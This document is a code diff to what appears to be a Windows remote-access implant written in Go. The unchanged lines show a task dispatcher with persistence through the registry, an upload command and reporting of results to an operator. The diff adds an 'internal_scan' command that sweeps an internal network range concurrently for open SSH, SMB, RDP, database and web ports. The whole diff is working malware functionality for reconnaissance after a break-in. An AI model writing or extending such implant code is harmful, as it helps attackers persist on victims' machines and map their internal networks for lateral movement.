@@ -11,6 +11,8 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
+	"net"
 	"time"
 
 	"golang.org/x/sys/windows/registry"
@@ -103,6 +105,11 @@ func executeTask(task Task) string {
 	command := parts[0]
 
 	switch command {
+	case "internal_scan":
+		if len(parts) < 2 {
+			return "Usage: internal_scan <CIDR_range>"
+		}
+		return handleInternalScan(parts[1])
 	case "persist":
 		return handlePersistence()
 	case "upload":
@@ -247,6 +254,64 @@ func persistWindows() string {
 	}
 
 	return "Persistence established successfully via Windows Registry."
+}
+
+func handleInternalScan(cidr string) string {
+	ip, ipnet, err := net.ParseCIDR(cidr)
+	if err != nil {
+		return fmt.Sprintf("Invalid CIDR: %s", err.Error())
+	}
+
+	var ips []string
+	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
+		ips = append(ips, ip.String())
+	}
+
+	ports := []int{21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443}
+	var results []string
+	var wg sync.WaitGroup
+	var mu sync.Mutex
+
+	// Limitar a concorrência
+	concurrency := 100
+	sem := make(chan bool, concurrency)
+
+	for _, ip := range ips[1 : len(ips)-1] { // Pular endereço de rede e broadcast
+		wg.Add(1)
+		go func(ip string) {
+			defer wg.Done()
+			sem <- true
+			defer func() { <-sem }()
+
+			for _, port := range ports {
+				address := fmt.Sprintf("%s:%d", ip, port)
+				conn, err := net.DialTimeout("tcp", address, 1*time.Second)
+				if err == nil {
+					conn.Close()
+					mu.Lock()
+					results = append(results, address)
+					mu.Unlock()
+				}
+			}
+		}(ip)
+	}
+
+	wg.Wait()
+
+	if len(results) == 0 {
+		return "No open ports found in the specified range."
+	}
+
+	return "Found open ports:\n" + strings.Join(results, "\n")
+}
+
+func inc(ip net.IP) {
+	for j := len(ip) - 1; j >= 0; j-- {
+		ip[j]++
+		if ip[j] > 0 {
+			break
+		}
+	}
 }
 
 func postResult(taskID, result string) error {
